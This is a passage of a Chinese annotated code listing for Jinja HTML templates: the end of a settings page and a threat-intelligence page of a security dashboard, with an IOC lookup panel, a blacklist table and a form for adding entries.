| 111 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 112 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__control">` |
| 113 | 输入控件：收集用户填写或选择的数据。 | `            <input type="text" class="form-input form-input--mono" data-bind="model_version" placeholder="v1" />` |
| 114 | HTML 结构：定义 `p` 元素及其属性或内容。 | `            <p class="settings-field__error" data-error="model_version"></p>` |
| 115 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 116 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 117 | 空行：分隔模板结构。 | `&nbsp;` |
| 118 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="settings-field" data-field="model_hot_reload">` |
| 119 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__head">` |
| 120 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__label">开启模型热更新</span>` |
| 121 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__hint"></span>` |
| 122 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 123 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__control">` |
| 124 | HTML 结构：定义 `label` 元素及其属性或内容。 | `            <label class="switch" style="align-self: flex-start">` |
| 125 | 输入控件：收集用户填写或选择的数据。 | `              <input type="checkbox" data-bind="model_hot_reload" />` |
| 126 | HTML 结构：定义 `span` 元素及其属性或内容。 | `              <span class="switch__track"></span>` |
| 127 | HTML 结构：定义 `span` 元素及其属性或内容。 | `              <span class="switch__thumb"></span>` |
| 128 | 标签闭合：结束当前 HTML 元素。 | `            </label>` |
| 129 | HTML 结构：定义 `p` 元素及其属性或内容。 | `            <p class="settings-field__error" data-error="model_hot_reload"></p>` |
| 130 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 131 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 132 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 133 | 标签闭合：结束当前 HTML 元素。 | `    </section>` |
| 134 | 空行：分隔模板结构。 | `&nbsp;` |
| 135 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `    {#- ===== 运行时（只读） ===== -#}` |
| 136 | HTML 结构：定义 `section` 元素及其属性或内容。 | `    <section class="settings-section" data-group="runtime">` |
| 137 | HTML 结构：定义 `header` 元素及其属性或内容。 | `      <header class="settings-section__header">` |
| 138 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `        <h3 class="settings-section__title">运行时参数（只读）</h3>` |
| 139 | HTML 结构：定义 `span` 元素及其属性或内容。 | `        <span class="settings-section__caption">` |
| 140 | 文本内容：作为页面可见文案或模板数据。 | `          这些值由 .env 与环境变量决定；修改后需重启应用生效` |
| 141 | 标签闭合：结束当前 HTML 元素。 | `        </span>` |
| 142 | 标签闭合：结束当前 HTML 元素。 | `      </header>` |
| 143 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="settings-section__body" id="runtime-body">` |
| 144 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="settings-field">` |
| 145 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__head">` |
| 146 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__label">Access Token 过期时间</span>` |
| 147 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__hint">环境变量 <code class="mono">JWT_TOKEN_EXPIRES</code>，单位秒</span>` |
| 148 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 149 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__control">` |
| 150 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__readonly" data-runtime="jwt_access_expires_seconds">—</span>` |
| 151 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 152 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 153 | 空行：分隔模板结构。 | `&nbsp;` |
| 154 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="settings-field">` |
| 155 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__head">` |
| 156 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__label">Refresh Token 过期时间</span>` |
| 157 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__hint">环境变量 <code class="mono">JWT_REFRESH_TOKEN_EXPIRES</code>，单位秒</span>` |
| 158 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 159 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__control">` |
| 160 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__readonly" data-runtime="jwt_refresh_expires_seconds">—</span>` |
| 161 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 162 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 163 | 空行：分隔模板结构。 | `&nbsp;` |
| 164 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="settings-field">` |
| 165 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__head">` |
| 166 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__label">API 限流策略</span>` |
| 167 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__hint">环境变量 <code class="mono">API_RATE_LIMIT</code>，Flask-Limiter 语法</span>` |
| 168 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 169 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__control">` |
| 170 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__readonly" data-runtime="api_rate_limit">—</span>` |
| 171 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 172 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 173 | 空行：分隔模板结构。 | `&nbsp;` |
| 174 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="settings-field">` |
| 175 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__head">` |
| 176 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__label">日志完整性保护</span>` |
| 177 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__hint">启用后日志写入会带 SHA-256 链式校验</span>` |
| 178 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 179 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__control">` |
| 180 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__readonly" data-runtime="log_integrity_enabled">—</span>` |
| 181 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 182 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 183 | 空行：分隔模板结构。 | `&nbsp;` |
| 184 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="settings-field">` |
| 185 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__head">` |
| 186 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__label">CORS 允许源</span>` |
| 187 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="settings-field__hint">环境变量 <code class="mono">ALLOWED_ORIGINS</code>（逗号分隔）</span>` |
| 188 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 189 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="settings-field__control settings-field__control--wide">` |
| 190 | HTML 结构：定义 `ul` 元素及其属性或内容。 | `            <ul class="settings-field__readonly" style="flex-direction: column; align-items: stretch; gap: 4px; padding: var(--space-sm) var(--space-md)" data-runtime="allowed_origins">` |
| 191 | HTML 结构：定义 `li` 元素及其属性或内容。 | `              <li class="text-tertiary">—</li>` |
| 192 | 标签闭合：结束当前 HTML 元素。 | `            </ul>` |
| 193 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 194 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 195 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 196 | 标签闭合：结束当前 HTML 元素。 | `    </section>` |
| 197 | 空行：分隔模板结构。 | `&nbsp;` |
| 198 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="settings-actions">` |
| 199 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="settings-actions__status" id="settings-status" role="status" aria-live="polite">` |
| 200 | HTML 结构：定义 `span` 元素及其属性或内容。 | `        <span id="settings-status-dot" class="status-light" aria-hidden="true"></span>` |
| 201 | HTML 结构：定义 `span` 元素及其属性或内容。 | `        <span id="settings-status-text">加载中…</span>` |
| 202 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 203 | 按钮控件：提供可点击操作入口。 | `      <button class="btn btn--ghost btn--sm" id="btn-reset" type="button" disabled>重置为已保存</button>` |
| 204 | 按钮控件：提供可点击操作入口。 | `      <button class="btn btn--primary btn--sm" id="btn-save" type="button" disabled>保存修改</button>` |
| 205 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 206 | 标签闭合：结束当前 HTML 元素。 | `  </div>` |
| 207 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 208 | 空行：分隔模板结构。 | `&nbsp;` |
| 209 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block page_scripts %}` |
| 210 | 脚本引用：加载页面所需 JavaScript。 | `  <script src="{{ url_for('static', filename='js/settings.js') }}"></script>` |
| 211 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |

## `web/templates/threat_intel.html`

- 类型：前端页面模板
- 行数：218

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% extends "base.html" %}` |
| 2 | 空行：分隔模板结构。 | `&nbsp;` |
| 3 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{#-` |
| 4 | 文本内容：作为页面可见文案或模板数据。 | `  威胁情报（Threat Intel）— Phase 7 Prompt §2.3 + 架构文档 §3.2` |
| 5 | 空行：分隔模板结构。 | `&nbsp;` |
| 6 | 文本内容：作为页面可见文案或模板数据。 | `  布局契约：` |
| 7 | 文本内容：作为页面可见文案或模板数据。 | `    - 查询面板：类型段控（IP / Domain）+ 值输入 + provider 复选 + 查询按钮` |
| 8 | 文本内容：作为页面可见文案或模板数据。 | `                 → 裁决条（malicious / clean）+ 三 provider 结果卡` |
| 9 | 文本内容：作为页面可见文案或模板数据。 | `    - IOC 列表：表格（类型/值/来源/评分/命中次数/原因/加入时间/操作）+ 筛选 + 新增抽屉` |
| 10 | 空行：分隔模板结构。 | `&nbsp;` |
| 11 | 文本内容：作为页面可见文案或模板数据。 | `  Provider 约定：` |
| 12 | 文本内容：作为页面可见文案或模板数据。 | `    - local：本地黑名单（同步到 ThreatIntelCollector，供检测前置过滤）` |
| 13 | 文本内容：作为页面可见文案或模板数据。 | `    - abuseipdb：有 API Key 则真实调用；DEBUG/THREAT_INTEL_MOCK 下走 mock` |
| 14 | 文本内容：作为页面可见文案或模板数据。 | `    - virustotal：同上` |
| 15 | 文本内容：作为页面可见文案或模板数据。 | `-#}` |
| 16 | 空行：分隔模板结构。 | `&nbsp;` |
| 17 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block title %}威胁情报 · AI Security Guardian{% endblock %}` |
| 18 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block topbar_title %}威胁情报{% endblock %}` |
| 19 | 空行：分隔模板结构。 | `&nbsp;` |
| 20 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block topbar_actions %}` |
| 21 | 按钮控件：提供可点击操作入口。 | `  <button class="btn btn--ghost btn--sm" id="btn-seed" type="button" hidden>生成演示 IOC</button>` |
| 22 | 按钮控件：提供可点击操作入口。 | `  <button class="btn btn--ghost btn--sm" id="btn-refresh" type="button">刷新</button>` |
| 23 | 按钮控件：提供可点击操作入口。 | `  <button class="btn btn--primary btn--sm" id="btn-new-ioc" type="button">新增 IOC</button>` |
| 24 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 25 | 空行：分隔模板结构。 | `&nbsp;` |
| 26 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block content %}` |
| 27 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section class="page-header" aria-label="情报统计">` |
| 28 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="page-header__meta" role="status" aria-live="polite">` |
| 29 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span>IOC 总数 <strong id="count-total">0</strong></span>` |
| 30 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span>IP <strong id="count-ip">0</strong></span>` |
| 31 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span>域名 <strong id="count-domain">0</strong></span>` |
| 32 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 33 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div id="provider-status" class="page-header__meta" aria-label="Provider 状态"></div>` |
| 34 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 35 | 空行：分隔模板结构。 | `&nbsp;` |
| 36 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `  {#- ===== 查询面板 ===== -#}` |
| 37 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section class="card" style="margin-bottom: var(--space-md)" aria-label="IOC 查询">` |
| 38 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="card__header">` |
| 39 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `      <h3 class="card__title">IOC 查询面板</h3>` |
| 40 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="text-tertiary" style="font-size: var(--fs-caption)">` |
| 41 | 文本内容：作为页面可见文案或模板数据。 | `        同时查询本地黑名单 / AbuseIPDB / VirusTotal` |
| 42 | 标签闭合：结束当前 HTML 元素。 | `      </span>` |
| 43 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 44 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="card__body">` |
| 45 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="query-panel">` |
| 46 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="query-panel__inputs">` |
| 47 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="filter-bar__group" style="padding: 0">` |
| 48 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="filter-bar__label">类型</span>` |
| 49 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="btn-group" role="group" aria-label="IOC 类型">` |
| 50 | 按钮控件：提供可点击操作入口。 | `              <button class="btn is-active" type="button" data-query-type="ip">IP</button>` |
| 51 | 按钮控件：提供可点击操作入口。 | `              <button class="btn" type="button" data-query-type="domain">域名</button>` |
| 52 | 标签闭合：结束当前 HTML 元素。 | `            </div>` |
| 53 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 54 | 空行：分隔模板结构。 | `&nbsp;` |
| 55 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="filter-bar__group" style="padding: 0">` |
| 56 | HTML 结构：定义 `label` 元素及其属性或内容。 | `            <label class="filter-bar__label" for="q-value">IOC 值</label>` |
| 57 | 输入控件：收集用户填写或选择的数据。 | `            <input` |
| 58 | 文本内容：作为页面可见文案或模板数据。 | `              id="q-value"` |
| 59 | 文本内容：作为页面可见文案或模板数据。 | `              class="form-input form-input--mono"` |
| 60 | 文本内容：作为页面可见文案或模板数据。 | `              type="text"` |
| 61 | 文本内容：作为页面可见文案或模板数据。 | `              placeholder="1.2.3.4 或 evil-example.com"` |
| 62 | 文本内容：作为页面可见文案或模板数据。 | `              autocomplete="off"` |
| 63 | 文本内容：作为页面可见文案或模板数据。 | `            />` |
| 64 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 65 | 空行：分隔模板结构。 | `&nbsp;` |
| 66 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div style="display: flex; gap: var(--space-sm); align-items: flex-end; min-height: 38px">` |
| 67 | 按钮控件：提供可点击操作入口。 | `            <button class="btn btn--primary btn--sm" id="btn-query" type="button">查询</button>` |
| 68 | 按钮控件：提供可点击操作入口。 | `            <button class="btn btn--ghost btn--sm" id="btn-query-clear" type="button">清空</button>` |
| 69 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 70 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 71 | 空行：分隔模板结构。 | `&nbsp;` |
| 72 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `        {#- 裁决横幅：查询前隐藏 -#}` |
| 73 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div id="query-verdict" class="query-verdict" hidden>` |
| 74 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div>` |
| 75 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="query-verdict__status" id="verdict-status">—</div>` |
| 76 | HTML 结构：定义 `div` 元素及其属性或内容。 | `            <div class="query-verdict__detail" id="verdict-detail">—</div>` |
| 77 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 78 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div style="margin-left: auto" class="text-tertiary" style="font-size: var(--fs-caption)">` |
| 79 | HTML 结构：定义 `span` 元素及其属性或内容。 | `            <span class="query-verdict__value" id="verdict-value"></span>` |
| 80 | 标签闭合：结束当前 HTML 元素。 | `          </div>` |
| 81 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 82 | 空行：分隔模板结构。 | `&nbsp;` |
| 83 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div id="provider-grid" class="provider-grid">` |
| 84 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `          {# 三个 provider 卡片由 JS 填充 #}` |
| 85 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 86 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 87 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 88 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 89 | 空行：分隔模板结构。 | `&nbsp;` |
| 90 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `  {#- ===== IOC 列表 ===== -#}` |
| 91 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section class="filter-bar" aria-label="IOC 筛选">` |
| 92 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="filter-bar__group">` |
| 93 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span class="filter-bar__label">类型</span>` |
| 94 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div class="btn-group" role="group" aria-label="按类型筛选">` |
| 95 | 按钮控件：提供可点击操作入口。 | `        <button class="btn is-active" type="button" data-list-type="">全部</button>` |
| 96 | 按钮控件：提供可点击操作入口。 | `        <button class="btn" type="button" data-list-type="ip">IP</button>` |
| 97 | 按钮控件：提供可点击操作入口。 | `        <button class="btn" type="button" data-list-type="domain">域名</button>` |
| 98 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 99 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 100 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="filter-bar__group">` |
| 101 | HTML 结构：定义 `label` 元素及其属性或内容。 | `      <label class="filter-bar__label" for="filter-source">来源</label>` |
| 102 | 输入控件：收集用户填写或选择的数据。 | `      <select id="filter-source" class="form-select">` |
| 103 | HTML 结构：定义 `option` 元素及其属性或内容。 | `        <option value="">全部来源</option>` |
| 104 | 标签闭合：结束当前 HTML 元素。 | `      </select>` |
| 105 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 106 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="filter-bar__group filter-bar__search">` |
| 107 | HTML 结构：定义 `label` 元素及其属性或内容。 | `      <label class="filter-bar__label" for="filter-q">搜索</label>` |
| 108 | 输入控件：收集用户填写或选择的数据。 | `      <input` |
| 109 | 文本内容：作为页面可见文案或模板数据。 | `        id="filter-q"` |
| 110 | 文本内容：作为页面可见文案或模板数据。 | `        class="form-input form-input--mono"` |
| 111 | 文本内容：作为页面可见文案或模板数据。 | `        type="search"` |
| 112 | 文本内容：作为页面可见文案或模板数据。 | `        placeholder="值 / 原因 / 备注…"` |
| 113 | 文本内容：作为页面可见文案或模板数据。 | `        autocomplete="off"` |
| 114 | 文本内容：作为页面可见文案或模板数据。 | `      />` |
| 115 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 116 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 117 | 空行：分隔模板结构。 | `&nbsp;` |
| 118 | HTML 结构：定义 `section` 元素及其属性或内容。 | `  <section class="card" aria-label="IOC 列表">` |
| 119 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="card__header">` |
| 120 | HTML 结构：定义 `h3` 元素及其属性或内容。 | `      <h3 class="card__title">IOC 列表</h3>` |
| 121 | HTML 结构：定义 `span` 元素及其属性或内容。 | `      <span id="list-status" class="text-tertiary" style="font-size: var(--fs-caption)"></span>` |
| 122 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 123 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="card__body">` |
| 124 | HTML 结构：定义 `div` 元素及其属性或内容。 | `      <div style="overflow-x: auto">` |
| 125 | HTML 结构：定义 `table` 元素及其属性或内容。 | `        <table class="table" id="iocs-table">` |
| 126 | HTML 结构：定义 `thead` 元素及其属性或内容。 | `          <thead>` |
| 127 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `            <tr>` |
| 128 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 72px">类型</th>` |
| 129 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th>值</th>` |
| 130 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 220px">来源</th>` |
| 131 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 90px" class="num">评分</th>` |
| 132 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 80px" class="num">命中</th>` |
| 133 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th>原因 / 备注</th>` |
| 134 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 160px">加入时间</th>` |
| 135 | HTML 结构：定义 `th` 元素及其属性或内容。 | `              <th style="width: 160px">操作</th>` |
| 136 | 标签闭合：结束当前 HTML 元素。 | `            </tr>` |
| 137 | 标签闭合：结束当前 HTML 元素。 | `          </thead>` |
| 138 | HTML 结构：定义 `tbody` 元素及其属性或内容。 | `          <tbody id="iocs-tbody">` |
| 139 | HTML 结构：定义 `tr` 元素及其属性或内容。 | `            <tr>` |
| 140 | HTML 结构：定义 `td` 元素及其属性或内容。 | `              <td colspan="8" class="alert-list__empty">` |
| 141 | HTML 结构：定义 `span` 元素及其属性或内容。 | `                <span class="loader" aria-hidden="true"></span>` |
| 142 | HTML 结构：定义 `span` 元素及其属性或内容。 | `                <span style="margin-left: 8px">加载中…</span>` |
| 143 | 标签闭合：结束当前 HTML 元素。 | `              </td>` |
| 144 | 标签闭合：结束当前 HTML 元素。 | `            </tr>` |
| 145 | 标签闭合：结束当前 HTML 元素。 | `          </tbody>` |
| 146 | 标签闭合：结束当前 HTML 元素。 | `        </table>` |
| 147 | 标签闭合：结束当前 HTML 元素。 | `      </div>` |
| 148 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 149 | 标签闭合：结束当前 HTML 元素。 | `  </section>` |
| 150 | 空行：分隔模板结构。 | `&nbsp;` |
| 151 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `  {#- ===== 新增 IOC 抽屉 ===== -#}` |
| 152 | HTML 结构：定义 `div` 元素及其属性或内容。 | `  <div id="drawer-overlay" class="drawer-overlay" aria-hidden="true"></div>` |
| 153 | HTML 结构：定义 `aside` 元素及其属性或内容。 | `  <aside` |
| 154 | 文本内容：作为页面可见文案或模板数据。 | `    id="ioc-drawer"` |
| 155 | 文本内容：作为页面可见文案或模板数据。 | `    class="drawer"` |
| 156 | 文本内容：作为页面可见文案或模板数据。 | `    role="dialog"` |
| 157 | 文本内容：作为页面可见文案或模板数据。 | `    aria-modal="true"` |
| 158 | 文本内容：作为页面可见文案或模板数据。 | `    aria-labelledby="drawer-title"` |
| 159 | 文本内容：作为页面可见文案或模板数据。 | `    aria-hidden="true"` |
| 160 | 文本内容：作为页面可见文案或模板数据。 | `  >` |
| 161 | HTML 结构：定义 `header` 元素及其属性或内容。 | `    <header class="drawer__header">` |
| 162 | HTML 结构：定义 `h2` 元素及其属性或内容。 | `      <h2 class="drawer__title" id="drawer-title">` |
| 163 | HTML 结构：定义 `span` 元素及其属性或内容。 | `        <span class="drawer__title-text">新增 IOC</span>` |
| 164 | 标签闭合：结束当前 HTML 元素。 | `      </h2>` |
| 165 | 按钮控件：提供可点击操作入口。 | `      <button class="drawer__close" id="drawer-close" type="button" aria-label="关闭">×</button>` |
| 166 | 标签闭合：结束当前 HTML 元素。 | `    </header>` |
| 167 | 空行：分隔模板结构。 | `&nbsp;` |
| 168 | HTML 结构：定义 `div` 元素及其属性或内容。 | `    <div class="drawer__body">` |
| 169 | 表单结构：承载用户输入和提交动作。 | `      <form id="ioc-form" autocomplete="off" onsubmit="return false">` |
| 170 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="form-group">` |
| 171 | HTML 结构：定义 `label` 元素及其属性或内容。 | `          <label class="form-label" for="f-type">类型</label>` |
| 172 | 输入控件：收集用户填写或选择的数据。 | `          <select id="f-type" class="form-select">` |
| 173 | HTML 结构：定义 `option` 元素及其属性或内容。 | `            <option value="ip" selected>IP</option>` |
| 174 | HTML 结构：定义 `option` 元素及其属性或内容。 | `            <option value="domain">域名</option>` |
| 175 | 标签闭合：结束当前 HTML 元素。 | `          </select>` |
| 176 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 177 | 空行：分隔模板结构。 | `&nbsp;` |
| 178 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="form-group">` |
| 179 | HTML 结构：定义 `label` 元素及其属性或内容。 | `          <label class="form-label" for="f-value">值</label>` |
| 180 | 输入控件：收集用户填写或选择的数据。 | `          <input id="f-value" class="form-input form-input--mono" type="text" required />` |
| 181 | HTML 结构：定义 `div` 元素及其属性或内容。 | `          <div class="form-error" id="e-value" hidden></div>` |
| 182 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 183 | 空行：分隔模板结构。 | `&nbsp;` |
| 184 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="form-group">` |
| 185 | HTML 结构：定义 `label` 元素及其属性或内容。 | `          <label class="form-label" for="f-source">来源</label>` |
| 186 | 输入控件：收集用户填写或选择的数据。 | `          <input id="f-source" class="form-input" type="text" value="manual" maxlength="40" />` |
| 187 | HTML 结构：定义 `small` 元素及其属性或内容。 | `          <small class="text-tertiary" style="font-size: var(--fs-caption)">` |
| 188 | 文本内容：作为页面可见文案或模板数据。 | `            来源标签（如 manual / abuseipdb / virustotal / phishtank / internal-report）` |
| 189 | 标签闭合：结束当前 HTML 元素。 | `          </small>` |
| 190 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 191 | 空行：分隔模板结构。 | `&nbsp;` |
| 192 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="form-group">` |
| 193 | HTML 结构：定义 `label` 元素及其属性或内容。 | `          <label class="form-label" for="f-score">评分（0~100，可空）</label>` |
| 194 | 输入控件：收集用户填写或选择的数据。 | `          <input id="f-score" class="form-input form-input--mono" type="number" min="0" max="100" placeholder="留空表示未评分" />` |
| 195 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 196 | 空行：分隔模板结构。 | `&nbsp;` |
| 197 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="form-group">` |
| 198 | HTML 结构：定义 `label` 元素及其属性或内容。 | `          <label class="form-label" for="f-reason">原因</label>` |
| 199 | 输入控件：收集用户填写或选择的数据。 | `          <input id="f-reason" class="form-input" type="text" maxlength="200" placeholder="为什么要加入黑名单" />` |
| 200 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 201 | 空行：分隔模板结构。 | `&nbsp;` |
| 202 | HTML 结构：定义 `div` 元素及其属性或内容。 | `        <div class="form-group">` |
| 203 | HTML 结构：定义 `label` 元素及其属性或内容。 | `          <label class="form-label" for="f-note">备注</label>` |
| 204 | 输入控件：收集用户填写或选择的数据。 | `          <textarea id="f-note" class="form-textarea" rows="2" maxlength="400"></textarea>` |
| 205 | 标签闭合：结束当前 HTML 元素。 | `        </div>` |
| 206 | 标签闭合：结束当前 HTML 元素。 | `      </form>` |
| 207 | 标签闭合：结束当前 HTML 元素。 | `    </div>` |
| 208 | 空行：分隔模板结构。 | `&nbsp;` |
| 209 | HTML 结构：定义 `footer` 元素及其属性或内容。 | `    <footer class="drawer__footer">` |
| 210 | 按钮控件：提供可点击操作入口。 | `      <button class="btn btn--ghost btn--sm" id="btn-drawer-cancel" type="button">取消</button>` |
| 211 | 按钮控件：提供可点击操作入口。 | `      <button class="btn btn--primary btn--sm" id="btn-drawer-save" type="button">添加到黑名单</button>` |
| 212 | 标签闭合：结束当前 HTML 元素。 | `    </footer>` |
| 213 | 标签闭合：结束当前 HTML 元素。 | `  </aside>` |
| 214 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
| 215 | 空行：分隔模板结构。 | `&nbsp;` |
